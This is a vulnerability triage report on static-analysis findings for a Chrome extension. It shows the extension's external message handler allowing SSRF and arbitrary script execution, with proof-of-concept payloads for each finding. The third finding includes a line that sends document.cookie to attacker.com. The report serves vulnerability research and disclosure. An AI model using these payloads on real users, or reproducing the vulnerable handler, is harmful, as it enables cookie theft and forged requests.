# CoCo Analysis: kenkngfjpllpommihjllgignpoeelgbe

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kenkngfjpllpommihjllgignpoeelgbe/opgen_generated_files/bg.js
Line 1046          xhttp.open(method, request.url, true);
                   request.url
```

**Code:**
```javascript
// Background script (lines 1032-1057)
chrome.runtime.onMessageExternal.addListener(  // ← External message listener
  function (request, sender, callback) {
      if (request.action == "xhttp") {
          var xhttp = new XMLHttpRequest();
          var method = request.method ? request.method.toUpperCase() : 'GET';

          xhttp.onload = function () {
              callback(xhttp.responseText);
          };
          xhttp.onerror = function () {
              callback();
          };
          xhttp.open(method, request.url, true);  // ← Attacker-controlled URL
          if (method == 'POST') {
              if (typeof request.contentType !== "undefined") {
                  xhttp.setRequestHeader('Content-Type', request.contentType);
              } else {
                  xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
              }
          }
          xhttp.send(request.data);  // ← Attacker-controlled data
          return true;
      }
      // ... other handlers
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via `chrome.runtime.onMessageExternal`

**Attack:**
```javascript
// From order.dgexpress.vn (or any whitelisted domain)
chrome.runtime.sendMessage(
  'kenkngfjpllpommihjllgignpoeelgbe',  // Extension ID
  {
    action: 'xhttp',
    method: 'POST',
    url: 'http://internal-server.local/admin/delete',  // ← SSRF to internal network
    data: 'action=deleteAll'
  }
);
```

**Impact:** SSRF (Server-Side Request Forgery) - Attacker can make the extension perform privileged cross-origin requests to any URL including internal networks, bypassing CORS and accessing resources not available from the web context.

---

## Sink 2: bg_chrome_runtime_MessageExternal → XMLHttpRequest_post_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kenkngfjpllpommihjllgignpoeelgbe/opgen_generated_files/bg.js
Line 1056          xhttp.send(request.data);
                   request.data
```

**Code:**
```javascript
// Same handler as Sink 1 (lines 1032-1057)
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, callback) {
      if (request.action == "xhttp") {
          var xhttp = new XMLHttpRequest();
          var method = request.method ? request.method.toUpperCase() : 'GET';

          xhttp.open(method, request.url, true);
          if (method == 'POST') {
              if (typeof request.contentType !== "undefined") {
                  xhttp.setRequestHeader('Content-Type', request.contentType);
              } else {
                  xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
              }
          }
          xhttp.send(request.data);  // ← Attacker controls POST body
          return true;
      }
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via `chrome.runtime.onMessageExternal`

**Attack:**
```javascript
// Send arbitrary POST data to arbitrary URLs
chrome.runtime.sendMessage(
  'kenkngfjpllpommihjllgignpoeelgbe',
  {
    action: 'xhttp',
    method: 'POST',
    url: 'http://victim-api.com/endpoint',
    contentType: 'application/json',
    data: JSON.stringify({ malicious: 'payload' })
  }
);
```

**Impact:** SSRF with POST data control - Attacker can send arbitrary POST requests with arbitrary data to any URL, including internal networks, with the extension's elevated privileges.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kenkngfjpllpommihjllgignpoeelgbe/opgen_generated_files/bg.js
Line 1088                        chrome.tabs.executeScript(tabArray[0].id, { code: request.code },
                                 request.code
```

**Code:**
```javascript
// Background script (lines 1084-1095)
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, callback) {
      // ... xhttp handler ...
      if (request.action == "executeScript") {
          chrome.tabs.query(
            { currentWindow: true, active: true },
            function (tabArray) {
                chrome.tabs.executeScript(tabArray[0].id, { code: request.code },  // ← Arbitrary code execution
                  function (results) { callback(results); });
            }
          )
      }
      return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via `chrome.runtime.onMessageExternal`

**Attack:**
```javascript
// Execute arbitrary JavaScript in the active tab
chrome.runtime.sendMessage(
  'kenkngfjpllpommihjllgignpoeelgbe',
  {
    action: 'executeScript',
    code: 'alert(document.cookie); fetch("http://attacker.com/steal?data=" + document.cookie);'
  }
);
```

**Impact:** Arbitrary code execution in the active tab - Attacker can execute arbitrary JavaScript in the context of the currently active tab, stealing sensitive data (cookies, passwords, form data), modifying page content, or performing actions on behalf of the user. This is the most severe vulnerability.

---

## Notes

**Manifest Restrictions:** The extension's manifest.json includes `externally_connectable` that restricts external messages to `https://order.dgexpress.vn/*` and `http://order.dgexpress.vn/*`. However, per the CoCo methodology (Critical Rule #1), we IGNORE manifest.json restrictions. If even ONE domain can trigger the vulnerability, it is a TRUE POSITIVE. The dgexpress.vn domain can fully exploit all three vulnerabilities.

**Permissions:** The extension has appropriate permissions in manifest.json for these operations (host permissions for order.dgexpress.vn and implicit tabs/scripting permissions via manifest v2).
